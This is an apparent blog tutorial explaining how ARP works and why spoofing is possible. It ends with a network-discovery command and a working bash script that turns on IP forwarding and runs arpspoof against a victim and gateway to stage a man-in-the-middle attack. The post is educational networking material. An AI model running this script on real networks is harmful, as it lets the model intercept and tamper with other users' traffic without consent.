+++
title = "How to perform an ARP Spoof Attack"
description = "How to perform an ARP Spoof Attack"
date = "2019-02-28"
author = "Isac Cavalcante"
cover = "images/arpattack.png"
+++
# ARP Spoofing

ARP is a protocol from The TCP/IP model, which stands for Address Resolution Protocol, and the purpose of it is to translate IP address to MAC address and vice versa.

![tcpip](/images/tcpip.png)

Each host has an ARP table, with the entries of IP/MAC associations from the other known hosts in the localnetwork. to check the ARP table from your host, run:

```sh
arp -a
```

How ARP protocol works: 

![arp1](/images/arp1.png)

Client sends and ARP request in broadcast:

![arp2](/images/arp2.png)

Only the host which has that IP address replies to the client:

![arp3](/images/arp3.png)

In the ARP spoofing attack, the attacker tells that he is the gateway to the victim, and tells that he is the other host to the gateway, forwarding the packets between both of them.

![arpattack](/images/arpattack.png)

ARP spoofing is possible because:
- Client accept arbitraty responses
- Client does not verifies if the responses are authentic

# Performing an attack

Discover the network
```
netdiscover -r 10.0.0.0/24
```


```bash
#!/bin/bash
# arpspoof_attack.sh
# 

INTERFACE=eth0
MY_ADDRESS=10.0.0.3
VICTIM_ADDRESS=10.0.0.2
GATEWAY_ADDRESS=10.0.0.1

echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i $INTERFACE -t $VICTIM_ADDRESS $GATEWAY_ADDRESS &
arpspoof -i $INTERFACE -t $GATEWAY_ADDRESS $VICTIM_ADDRESS 
```



